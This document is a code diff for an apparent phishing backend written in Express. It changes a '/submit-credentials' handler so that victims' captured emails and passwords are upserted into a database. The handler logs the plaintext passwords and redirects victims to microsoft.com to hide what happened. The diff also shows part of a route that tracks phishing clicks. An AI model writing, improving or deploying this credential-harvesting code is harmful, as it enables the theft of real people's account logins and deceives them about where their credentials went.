@@ -126,14 +126,22 @@ app.post("/submit-credentials", async (req, res) => {
   }
 
   try {
-    await CapturedCredential.create({ email, password });
-    console.log("Captured credentials saved:", { email, password });
+    await CapturedCredential.findOneAndUpdate(
+      { email }, // Match by email
+      {
+        $set: { password, timestamp: new Date() } // Update password and timestamp
+      },
+      { upsert: true, new: true } // Insert if not found
+    );
+
+    console.log("Captured credentials saved/updated:", { email, password });
     res.redirect("https://www.microsoft.com");
   } catch (err) {
     console.error("Error saving credentials:", err);
     res.status(500).json({ error: "Server error" });
   }
 });
+
 
 app.get("/api/phishing-clicks", async (req, res) => {
   try {
